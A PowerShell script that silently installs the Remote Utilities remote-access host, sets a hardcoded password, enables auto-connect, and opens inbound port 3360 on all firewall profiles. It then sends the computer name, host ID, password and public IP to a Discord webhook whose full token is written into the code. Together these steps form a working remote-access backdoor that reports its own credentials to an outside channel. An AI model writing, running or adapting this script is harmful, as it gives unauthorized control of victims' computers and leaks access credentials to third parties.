$discordWebhook = if ($env:RU_DISCORD_WEBHOOK) { $env:RU_DISCORD_WEBHOOK } else { "https://discord.com/api/webhooks/1493692725919219792/LCiq_4OQ2jPQyPD9SrkMx7ux7oHAhSQOS5s4NZ1_H4aXU4eVpZm4SS2c8NsLwRVE2xGT" }
$hostPassword  = "FreePwd123!"
$downloadUrl   = "https://www.remoteutilities.com/download/host-7.7.3.0.exe"
$installerPath = "$env:TEMP\RU-Setup.exe"
$hostName      = $env:COMPUTERNAME
$hostKey       = "HKLM:\SOFTWARE\Remote Utilities\Host"

Write-Host "Downloading..."
Invoke-WebRequest -Uri $downloadUrl -OutFile $installerPath -UseBasicParsing

Write-Host "Installing..."
Start-Process -FilePath $installerPath -ArgumentList "/SILENT","/NORESTART" -Wait -NoNewWindow
Start-Sleep -Seconds 10

# Configure registry
if (-not (Test-Path $hostKey)) { New-Item -Path $hostKey -Force | Out-Null }
Set-ItemProperty -Path $hostKey -Name "HostName" -Value $hostName
Set-ItemProperty -Path $hostKey -Name "InternetIdEnabled" -Value 1 -Type DWord
Set-ItemProperty -Path $hostKey -Name "InternetIdAutoConnect" -Value 1 -Type DWord

# Set password
$md5     = [System.Security.Cryptography.MD5]::Create()
$hashHex = ($md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hostPassword)) | ForEach-Object { $_.ToString("x2") }) -join ""
Set-ItemProperty -Path $hostKey -Name "PasswordEnabled" -Value 1
Set-ItemProperty -Path $hostKey -Name "PasswordMD5" -Value $hashHex

# Firewall
New-NetFirewallRule -DisplayName "Remote Utilities Host" -Direction Inbound -Protocol TCP -LocalPort 3360 -Action Allow -Profile Any -ErrorAction SilentlyContinue

# Restart service to apply settings
$svc = Get-Service | Where-Object { $_.DisplayName -like "*Remote Utilities*" } | Select-Object -First 1
if ($svc) {
    Stop-Service -Name $svc.Name -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
    Set-Service -Name $svc.Name -StartupType Automatic
    Start-Service -Name $svc.Name
    Write-Host "Service started: $($svc.Name)"
}

# Wait longer for Host ID to generate
Write-Host "Waiting for Host ID to generate..."
$hostID = $null
$attempts = 0
while (-not $hostID -and $attempts -lt 12) {
    Start-Sleep -Seconds 5
    $hostID = (Get-ItemProperty -Path $hostKey -Name HostID -ErrorAction SilentlyContinue).HostID
    $attempts++
    Write-Host "Attempt $attempts - Host ID: $hostID"
}

# Get public IP as backup connection method
$publicIP = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content

# Send Discord notification
$body = '{"username":"RU-Installer","embeds":[{"title":"Host Ready","color":65280,"fields":[{"name":"Computer","value":"' + $hostName + '","inline":true},{"name":"Host ID","value":"' + $hostID + '","inline":true},{"name":"Password","value":"' + $hostPassword + '","inline":true},{"name":"Public IP","value":"' + $publicIP + '","inline":true}]}]}'
try { Invoke-RestMethod -Uri $discordWebhook -Method Post -ContentType "application/json" -Body $body; Write-Host "Discord notified!" }
catch { Write-Warning "Discord failed: $_" }

Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
Write-Host "Done. Host ID: $hostID  Public IP: $publicIP"
